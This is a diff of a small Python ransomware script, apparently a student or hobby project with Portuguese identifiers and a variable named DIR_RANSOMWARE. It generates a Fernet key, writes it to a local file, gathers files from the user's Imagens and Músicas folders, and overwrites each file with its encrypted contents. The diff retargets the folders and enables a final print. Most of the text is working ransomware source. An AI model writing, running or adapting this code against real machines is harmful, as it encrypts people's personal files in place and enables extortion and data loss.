@@ -1,19 +1,21 @@
-#%%
 import os
 from cryptography.fernet import Fernet
 
-print(os.path.abspath(__file__))
+DIR_RANSOMWARE = os.path.dirname(os.path.dirname(__file__))
+DIR_USER = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(DIR_RANSOMWARE)))))
 
-#%%
+PASTA_IMAGENS = os.path.join(DIR_USER, "Imagens")
+PASTA_MUSICAS = os.path.join(DIR_USER, "Músicas")
+
+
 key = Fernet.generate_key()
 with open('chave.key', 'wb') as chave:
     chave.write(key)
 
 username = os.getenv('USERNAME')
 folders = [
-    os.path.join(fr"C:\Users\{username}\OneDrive\Imagens"),
-    os.path.join(fr"C:\Users\{username}\Videos"),
-    os.path.join(fr"C:\Users\{username}\Downloads")
+    PASTA_IMAGENS,
+    PASTA_MUSICAS
 ]
 
 arquivos = []
@@ -35,4 +37,4 @@ for arquivo in arquivos:
 
         with open(arquivo, 'wb') as file:
             file.write(conteudo_criptografado)
-# print(arquivos)
+print(arquivos)
